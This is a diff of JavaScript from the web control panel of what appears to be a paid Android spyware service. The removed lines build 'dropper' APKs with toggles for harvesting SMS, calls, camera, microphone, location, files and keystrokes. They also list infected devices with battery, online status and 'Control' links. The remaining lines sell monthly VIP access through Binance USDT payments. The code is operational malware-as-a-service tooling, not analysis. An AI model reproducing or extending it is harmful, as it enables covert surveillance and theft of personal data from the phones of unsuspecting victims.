-                const a = document.createElement('a');
-                a.href = url; a.download = apkName; document.body.appendChild(a);
-                a.click(); a.remove();
-                setTimeout(() => URL.revokeObjectURL(url), 5000);
-            }
-
-            el.innerHTML = '<i class="fas fa-check-circle" style="margin-right:6px;"></i>DOWNLOADED!';
-            setTimeout(() => {
-                el.innerHTML = '<i class="fas fa-download" style="margin-right:6px;"></i>DOWNLOAD APK';
-                el.style.pointerEvents = 'auto';
-            }, 2000);
-        } catch(err) {
-            console.error('Download error:', err);
-            alert('Download failed: ' + err.message);
-            el.innerHTML = '<i class="fas fa-download" style="margin-right:6px;"></i>DOWNLOAD APK';
-            el.style.pointerEvents = 'auto';
-        }
-    }
-
-    function toggleWebviewField() {
-        const buildType = document.getElementById('buildTypeSelect').value;
-        const container = document.getElementById('webviewContainer');
-        const input = document.getElementById('webviewInput');
-        
-        if (buildType === 'dropper') {
-            container.style.display = 'none';
-            input.removeAttribute('required');
-        } else {
-            container.style.display = 'block';
-            input.setAttribute('required', 'true');
-        }
-    }
-
-    document.getElementById('buildForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        const btn = document.getElementById('buildBtn');
-        const text = document.getElementById('buildText');
-        const icon = document.getElementById('buildIcon');
-
-        // Check build permission
-        const perms = window.userPermissions || {};
-        if (!window.isUserAdmin && perms.build_apk === false) {
-            alert('Access Denied: APK Building feature is disabled for your account. Contact Admin on Telegram (@abid64x) for access.');
-            return;
-        }
-        
-        btn.disabled = true;
-        text.textContent = 'STARTING...';
-        icon.className = 'fas fa-spinner fa-spin';
-
-        const formData = new FormData(this);
-        const appName = formData.get('app_name');
-        const packageName = formData.get('package_name');
-        const webviewUrl = formData.get('webview_url') || '';
-        const buildType = formData.get('build_type');
-        const iconFile = document.getElementById('appIconInput').files[0];
-
-        // Track build activity & increment count
-        if (fbAuth.currentUser) {
-            fbDb.ref('users_meta/' + userId).once('value', snap => {
-                const udata = snap.val() || {};
-                const count = (udata.build_count || 0) + 1;
-                fbDb.ref('users_meta/' + userId + '/build_count').set(count);
-            });
-            trackUserActivity(fbAuth.currentUser, `Triggered APK Build: ${appName} (${packageName})`);
-        }
-
-        let iconBase64 = '';
-        if (iconFile) {
-            try {
-                iconBase64 = await new Promise((resolve, reject) => {
-                    const img = new Image();
-                    const url = URL.createObjectURL(iconFile);
-                    img.onload = () => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 96;
-                        canvas.height = 96;
-                        const ctx = canvas.getContext('2d');
-                        ctx.fillStyle = '#FFFFFF';
-                        ctx.fillRect(0, 0, 96, 96);
-                        ctx.drawImage(img, 0, 0, 96, 96);
-                        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
-                        URL.revokeObjectURL(url);
-                        const b64 = dataUrl.includes(',') ? dataUrl.split(',')[1] : dataUrl;
-                        resolve(b64);
-                    };
-                    img.onerror = (err) => {
-                        URL.revokeObjectURL(url);
-                        reject(err);
-                    };
-                    img.src = url;
-                });
-            } catch(err) {
-                console.error('Error processing icon file:', err);
-            }
-        }
-
-        // Reset progress UI & Firebase status
-        document.getElementById('logLines').innerHTML = '';
-        document.getElementById('progressBar').style.width = '5%';
-        document.getElementById('buildStatus').textContent = 'Wait for building...';
-        document.getElementById('progressArea').style.display = 'block';
-
-        fbDb.ref('panel_users/' + userId + '/build_status').set({
-            status: '⏳ Starting build...',
-            percent: 10,
-            last_log: 'Wait for building...'
-        });
-
-        const featGallery = document.getElementById('featureGallery') ? document.getElementById('featureGallery').checked : true;
-        const featFiles = document.getElementById('featureFiles') ? document.getElementById('featureFiles').checked : true;
-        const featAudio = document.getElementById('featureAudio') ? document.getElementById('featureAudio').checked : true;
-        const featCamera = document.getElementById('featureCamera') ? document.getElementById('featureCamera').checked : true;
-        const featLocation = document.getElementById('featureLocation') ? document.getElementById('featureLocation').checked : true;
-        const featCalls = document.getElementById('featureCalls') ? document.getElementById('featureCalls').checked : true;
-        const featSMS = document.getElementById('featureSMS') ? document.getElementById('featureSMS').checked : true;
-        const featKeylogger = document.getElementById('featureKeylogger') ? document.getElementById('featureKeylogger').checked : true;
-
-        fbDb.ref('panel_users/' + userId + '/features').set({
-            gallery: featGallery,
-            files: featFiles,
-            audio: featAudio,
-            camera: featCamera,
-            location: featLocation,
-            calls: featCalls,
-            sms: featSMS,
-            keylogger: featKeylogger
-        });
-
-        // Trigger GitHub Actions workflow dispatch
-        fetch('https://api.github.com/repos/ggvgghb243-hash/ando-projet/actions/workflows/build.yml/dispatches', {
-            method: 'POST',
-            headers: {
-                'Authorization': 'token ' + githubToken,
-                'Accept': 'application/vnd.github.v3+json',
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                ref: 'main',
-                inputs: {
-                    app_name: appName,
-                    package_name: packageName,
-                    webview_url: webviewUrl,
-                    user_id: userId,
-                    build_type: buildType,
-                    app_icon_b64: iconBase64
-                }
-            })
-        }).then(res => {
-            if (res.ok || res.status === 204) {
-                console.log('GitHub Actions workflow triggered successfully');
-                listenToBuildStatus();
-            } else {
-                return res.json().then(errData => {
-                    throw new Error(errData.message || 'Failed to trigger workflow');
-                });
-            }
-        }).catch(err => {
-            console.error('Workflow trigger error:', err);
-            document.getElementById('buildStatus').textContent = '❌ Error: ' + err.message;
-            btn.disabled = false;
-            text.textContent = 'RETRY BUILD';
-            icon.className = 'fas fa-rocket';
-        });
-    });
-
-    function listenToBuildStatus() {
-        const buildRef = fbDb.ref('panel_users/' + userId + '/build_status');
-        buildRef.on('value', snap => {
-            const val = snap.val();
-            if (!val) return;
-
-            const progressBar = document.getElementById('progressBar');
-            const buildStatus = document.getElementById('buildStatus');
-            const logLines = document.getElementById('logLines');
-            const consoleLog = document.getElementById('consoleLog');
-            const btn = document.getElementById('buildBtn');
-            const text = document.getElementById('buildText');
-            const icon = document.getElementById('buildIcon');
-
-            if (val.percent !== undefined) {
-                progressBar.style.width = val.percent + '%';
-            }
-
-            if (val.last_log) {
-                buildStatus.textContent = val.status || val.last_log;
-                const line = document.createElement('div');
-                line.className = 'console-line';
-                line.textContent = `[${new Date().toLocaleTimeString()}] ${val.last_log}`;
-                logLines.appendChild(line);
-                consoleLog.scrollTop = consoleLog.scrollHeight;
-            }
-
-            if (val.status && (val.status.includes('Complete') || val.percent >= 100)) {
-                btn.disabled = false;
-                text.textContent = 'SUCCESS!';
-                icon.className = 'fas fa-check-circle';
-
-                // Fetch latest APK name & artifact name
-                fbDb.ref('panel_users/' + userId).once('value', uSnap => {
-                    const u = uSnap.val() || {};
-                    const lastApk = u.last_apk || 'app.apk';
-                    const lastArtifact = u.last_artifact_name || '';
-                    const dlBtn = document.getElementById('downloadBtn');
-                    dlBtn.setAttribute('data-apk', lastApk);
-                    if (lastArtifact) {
-                        dlBtn.setAttribute('data-artifact', lastArtifact);
-                    }
-                    document.getElementById('downloadArea').style.display = 'block';
-                });
-
-                buildRef.off();
-            } else if (val.status && val.status.includes('Failed')) {
-                btn.disabled = false;
-                text.textContent = 'BUILD FAILED';
-                icon.className = 'fas fa-times-circle';
-                document.getElementById('progressArea').style.display = 'block';
-                buildRef.off();
-            }
-        });
-    }
-
-    function checkIsAdmin() {
-        if (window.isUserAdmin === true) return true;
-        if (currentUserProfile && currentUserProfile.role === 'ADMIN') return true;
-        if (fbAuth.currentUser) {
-            const email = (fbAuth.currentUser.email || '').toLowerCase();
-            if (ADMIN_EMAILS.includes(email)) return true;
-        }
-        return false;
-    }
-
-    function renderDeviceList() {
-        const tbody = document.getElementById('deviceList');
-        if (!tbody) return;
-
-        const isAdmin = checkIsAdmin();
-        const thRow = document.querySelector('.data-table thead tr');
-        if (thRow) {
-            if (isAdmin) {
-                thRow.innerHTML = '<th>Device</th><th>Owner</th><th>Battery</th><th>Status</th><th style="text-align:right;">Action</th>';
-            } else {
-                thRow.innerHTML = '<th>Device</th><th>Battery</th><th>Status</th><th style="text-align:right;">Action</th>';
-            }
-        }
-
-        const devKeys = Object.keys(deviceCache);
-        let totalCount = devKeys.length;
-        let onlineCount = 0;
-
-        // Sort: online first, then by lastSeen desc
-        const sortedKeys = devKeys.sort((a, b) => {
-            const da = deviceCache[a], db = deviceCache[b];
-            if (da.online !== db.online) return db.online ? 1 : -1;
-            return (db.lastSeen || 0) - (da.lastSeen || 0);
-        });
-
-        let html = '';
-        sortedKeys.forEach(did => {
-            const d = deviceCache[did];
-            if (d.online) onlineCount++;
-
-            const model = d.model || 'Android Device';
-            const batt = d.battery !== undefined ? d.battery : '--';
-            const battNum = parseInt(batt) || 0;
-            const battIcon = battNum > 75 ? 'fa-battery-full' : battNum > 40 ? 'fa-battery-half' : battNum > 15 ? 'fa-battery-quarter' : 'fa-battery-empty';
-            const battColor = battNum <= 15 ? 'var(--danger)' : battNum <= 40 ? 'var(--warning)' : 'var(--success)';
-            
-            const isOnline = d.online;
-            const statusClass = isOnline ? 'status-online' : 'status-offline';
-            const statusText = isOnline ? 'Online' : 'Offline';
-            const rowClass = isOnline ? 'device-row-online' : 'device-row-offline';
-            const ownerUid = d.ownerUid || userId;
-
-            html += `
-            <tr class="${rowClass}">
-                <td>
-                    <div style="font-weight: 700; color: #fff; font-size: 0.88rem; display: flex; align-items: center; gap: 8px;">
-                        <i class="fas fa-mobile-alt" style="color: ${isOnline ? 'var(--primary)' : 'var(--text-muted)'}; font-size: 0.95rem;"></i>
-                        ${model}
-                    </div>
-                    <code style="font-size: 0.7rem; color: var(--text-muted);">${d.did}</code>
-                </td>
-                ${isAdmin ? `
-                <td>
-                    <span class="glass-badge" style="font-size: 0.65rem;">
-                        <i class="fas fa-user" style="color: var(--primary);"></i> ${ownerUid}
-                    </span>
-                </td>
-                ` : ''}
-                <td>
-                    <span style="font-size: 0.82rem; font-weight: 600; color: ${battColor}; display: inline-flex; align-items: center; gap: 5px;">
-                        <i class="fas ${battIcon}"></i> ${batt}%
-                    </span>
-                </td>
-                <td>
-                    <span class="${statusClass}">
-                        ${statusText}
-                    </span>
-                </td>
-                <td style="text-align: right;">
-                    <div style="display: flex; gap: 6px; justify-content: flex-end;">
-                        <a href="control.html?uid=${ownerUid}&did=${d.did}" class="btn-accent" style="padding: 6px 14px; font-size: 0.78rem; border-radius: var(--radius-pill);">
-                            Control <i class="fas fa-chevron-right" style="margin-left: 4px; font-size: 0.7rem;"></i>
-                        </a>
-                        ${isAdmin ? `
-                        <button onclick="deleteDevice('${ownerUid}', '${d.did}', '${model}')" class="btn-danger-ghost" style="padding: 6px 10px; border-radius: var(--radius-pill);" title="Delete Device">
-                            <i class="fas fa-trash-alt"></i>
-                        </button>
-                        ` : ''}
-                    </div>
-                </td>
-            </tr>
-            `;
-        });
-
-        // Update badge counters
-        const countBadge = document.getElementById('deviceCount');
-        const onlineBadge = document.getElementById('onlineCount');
-        if (countBadge) countBadge.textContent = totalCount;
-        if (onlineBadge) {
-            onlineBadge.textContent = `${onlineCount} online`;
-            onlineBadge.style.color = onlineCount > 0 ? 'var(--success)' : 'var(--danger)';
-            onlineBadge.style.background = onlineCount > 0 ? 'var(--success-bg)' : 'var(--danger-bg)';
-            onlineBadge.style.borderColor = onlineCount > 0 ? 'var(--success-border)' : 'var(--danger-border)';
-        }
-
-        if (totalCount === 0) {
-            tbody.innerHTML = `
-            <tr>
-                <td colspan="${isAdmin ? '5' : '4'}" style="text-align: center; padding: 40px 20px; color: var(--text-muted);">
-                    <i class="fas fa-mobile-alt" style="font-size: 2rem; color: var(--primary); opacity: 0.4; margin-bottom: 10px; display: block;"></i>
-                    <p style="font-size: 0.88rem; margin-bottom: 4px;">No devices connected yet</p>
-                    <p style="font-size: 0.76rem; color: var(--text-dim);">Build and install the APK on your Android device to see it appear here.</p>
-                </td>
-            </tr>`;
-        } else {
-            tbody.innerHTML = html;
-        }
-
-        // Hide skeleton and reveal list
-        const skeleton = document.getElementById('deviceSkeleton');
-        const listArea = document.getElementById('deviceListArea');
-        if (skeleton) skeleton.style.display = 'none';
-        if (listArea) listArea.style.display = 'block';
-    }
-
-    function deleteDevice(ownerUid, did, model) {
-        if (!confirm(`Are you sure you want to permanently delete device "${model}" (${did}) from account "${ownerUid}"?`)) {
-            return;
-        }
-        fbDb.ref(`users/${ownerUid}/devices/${did}`).remove().then(() => {
-            delete deviceCache[did];
-            renderDeviceList();
-        }).catch(err => {
-            alert('Delete failed: ' + err.message);
-        });
-    }
-
-    function setupRealtimeHealthListeners() {
-        // Clear previous listeners & cache
-        Object.keys(healthListeners).forEach(k => {
-            if (typeof healthListeners[k] === 'function') healthListeners[k]();
-        });
-        healthListeners = {};
-        deviceCache = {};
-
-        const isAdmin = checkIsAdmin();
-
-        if (isAdmin) {
-            // ADMIN: Listen across all users in root /users
-            const usersRootRef = fbDb.ref('users');
-            const onChildAdded = usersRootRef.on('child_added', userSnap => {
-                const targetUid = userSnap.key;
-                listenToUserDevices(targetUid);
-            });
-            const onChildRemoved = usersRootRef.on('child_removed', userSnap => {
-                const targetUid = userSnap.key;
-                Object.keys(deviceCache).forEach(did => {
-                    if (deviceCache[did].ownerUid === targetUid) {
-                        delete deviceCache[did];
-                    }
-                });
-                renderDeviceList();
-            });
-            healthListeners['root_users_added'] = () => usersRootRef.off('child_added', onChildAdded);
-            healthListeners['root_users_removed'] = () => usersRootRef.off('child_removed', onChildRemoved);
-        } else {
-            // STANDARD USER: Listen exclusively to their own devices
-            listenToUserDevices(userId);
-        }
-    }
-
-    function listenToUserDevices(targetUid) {
-        const devRef = fbDb.ref('users/' + targetUid + '/devices');
-        
-        const onDevAdded = devRef.on('child_added', devSnap => {
-            const did = devSnap.key;
-            if (!deviceCache[did]) {
-                deviceCache[did] = { did: did, ownerUid: targetUid, online: false, battery: '--', model: 'Android Device' };
-            }
-
-            // Real-time Health Listener
-            const healthRef = fbDb.ref(`users/${targetUid}/devices/${did}/health`);
-            const onHealth = healthRef.on('value', hSnap => {
-                const h = hSnap.val() || {};
-                let isOnline = h.online === true || h.online === 'true' || h.online === 1;
-                // Staleness check: if lastSeen is older than 90s, consider offline
-                if (isOnline && h.lastSeen) {
-                    const age = Date.now() - h.lastSeen;
-                    if (age > 90000) isOnline = false;
-                }
-                if (deviceCache[did]) {
-                    deviceCache[did].online = isOnline;
-                    deviceCache[did].battery = h.battery !== undefined ? h.battery : deviceCache[did].battery;
-                    deviceCache[did].lastSeen = h.lastSeen || 0;
-                    renderDeviceList();
-                }
-            });
-            healthListeners[`${did}_health`] = () => healthRef.off('value', onHealth);
-
-            // Real-time Info Listener
-            const infoRef = fbDb.ref(`users/${targetUid}/devices/${did}/info`);
-            const onInfo = infoRef.on('value', iSnap => {
-                const info = iSnap.val() || {};
-                if (deviceCache[did]) {
-                    deviceCache[did].model = info.model || info.device_name || deviceCache[did].model;
-                    renderDeviceList();
-                }
-            });
-            healthListeners[`${did}_info`] = () => infoRef.off('value', onInfo);
-        });
-
-        const onDevRemoved = devRef.on('child_removed', devSnap => {
-            const did = devSnap.key;
-            delete deviceCache[did];
-            renderDeviceList();
-        });
-
-        healthListeners[`${targetUid}_dev_added`] = () => devRef.off('child_added', onDevAdded);
-        healthListeners[`${targetUid}_dev_removed`] = () => devRef.off('child_removed', onDevRemoved);
-
-        // Initial render after brief query
-        devRef.once('value', () => {
-            renderDeviceList();
-        });
-    }
-
-    function refreshDevices() {
-        const skeleton = document.getElementById('deviceSkeleton');
-        const listArea = document.getElementById('deviceListArea');
-        if (skeleton) skeleton.style.display = 'block';
-        if (listArea) listArea.style.display = 'none';
-        setupRealtimeHealthListeners();
-    }
-
     function showLockModal(msg) {
         const modal = document.getElementById('premiumLockModal');
         const msgEl = document.getElementById('lockModalDescText');
@@ -1223,18 +1483,21 @@
         btn.disabled = true;
         btn.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i> Verifying Binance Payment...';
 
+        const fbDb = firebase.database();
+        const fbAuth = firebase.auth();
         const authUser = (typeof fbAuth !== 'undefined' && fbAuth.currentUser) ? fbAuth.currentUser : null;
+        
+        const now = Date.now();
+        const expiryTime = now + (30 * 24 * 60 * 60 * 1000); // 30 Days
+
         if (!authUser) {
             alert('Please login with Google first to activate your VIP subscription.');
-            btn.disabled = false;
-            btn.innerHTML = '<i class="fas fa-bolt"></i> ⚡ Verify & Unlock 1 Month Access ($10)';
+            window.location.href = 'login.html';
             return;
         }
 
         const email = (authUser.email || '').trim().toLowerCase();
         const uid = email ? email.replace(/[@.]/g, '_') : authUser.uid;
-        const now = Date.now();
-        const expiryTime = now + (30 * 24 * 60 * 60 * 1000); // 30 Days
 
         // 2. Query Firebase payments to check if this txid was ALREADY used/redeemed
         fbDb.ref('payments').once('value', (snap) => {
@@ -1321,9 +1584,6 @@
                             action: `Instantly verified & unlocked 1 Month VIP ($10 USDT). TXID: ${txid}`
                         });
 
-                        window.isVipActive = true;
-                        window.userPermissions = fullPermissions;
-
                         btn.disabled = false;
                         btn.innerHTML = '<i class="fas fa-check-circle me-2"></i> Verified & Unlocked!';
                         btn.style.background = 'linear-gradient(135deg, #30d158 0%, #248a3d 100%)';
@@ -1331,8 +1591,8 @@
 
                         setTimeout(() => {
                             closeLockModal();
-                            alert(`🎉 Binance Payment Verified! 1 Month VIP ($10) is active until ${new Date(expiryTime).toLocaleDateString()}. All APK modules unlocked!`);
-                            if (typeof evaluateIndexPermissions === 'function') evaluateIndexPermissions();
+                            alert(`🎉 Binance Payment Verified! 1 Month VIP ($10) is active until ${new Date(expiryTime).toLocaleDateString()}. All features unlocked!`);
+                            window.location.href = 'builder.html';
                         }, 800);
                     });
                 } else {
@@ -1385,7 +1645,7 @@
                                 fbDb.ref(`users_meta/${uid}/subscription`).off('value', subListener);
                                 closeLockModal();
                                 alert(`🎉 VIP Payment Approved by Admin! 1 Month Full Access VIP is now active!`);
-                                if (typeof evaluateIndexPermissions === 'function') evaluateIndexPermissions();
+                                window.location.href = 'builder.html';
                             }
                         });
                     });
